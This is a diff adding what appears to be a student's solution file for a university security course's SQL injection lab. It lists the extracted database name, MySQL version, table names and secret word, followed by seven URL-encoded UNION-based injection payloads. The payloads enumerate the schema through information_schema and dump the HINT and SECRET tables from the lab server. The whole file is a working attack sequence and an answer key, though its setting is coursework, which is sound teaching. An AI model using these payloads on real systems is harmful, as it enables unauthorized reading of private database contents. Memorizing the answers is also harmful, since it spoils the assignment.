@@ -1,0 +1,12 @@
+proj2_inject3
+8.0.30-0ubuntu0.22.04.1
+HINT,SECRET,foo,inject3_users
+clavicle
+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+%27%27+as+col2%2C+database%28%29%2C+%27%27+as+col3%2C+%27%27+as+col4+%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+%27%27+as+col2%2C+%40%40version%2C+%27%27+as+col3%2C+%27%27+as+col4+%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+select+%27%27+as+col1%2C+GROUP_CONCAT%28table_name%29%2C+%27%27+as+col3%2C+%27%27+as+col4+from+information_schema.tables+where+table_schema%3D%27proj2_inject3%27%3B+%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+select+%27%27+as+col1%2C+group_concat(column_name)%2C+%27%27+as+col3%2C+%27%27+as+col4+from+information_schema.columns+where+table_name%3D+%27HINT%27%3B+%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+%27%27+as+getmessage%2C+group_concat%28message%29%2C+%27%27+as+col3%2C+%27%27+as+col4+from+HINT%3B+%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+select+%27%27+as+secret_cols%2C+group_concat%28column_name%29%2C+%27%27+as+col3%2C+%27%27+as+col4+from+information_schema.columns+where+table_name%3D+%27SECRET%27%3B+%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+%27%27+as+mysecret%2C+group_concat%28secret%29%2C+%27%27+as+col3%2C+%27%27+as+col4+from+SECRET+where+hash%3D%27581f80d6916f063e2c82105f214b2d4a%27+%23
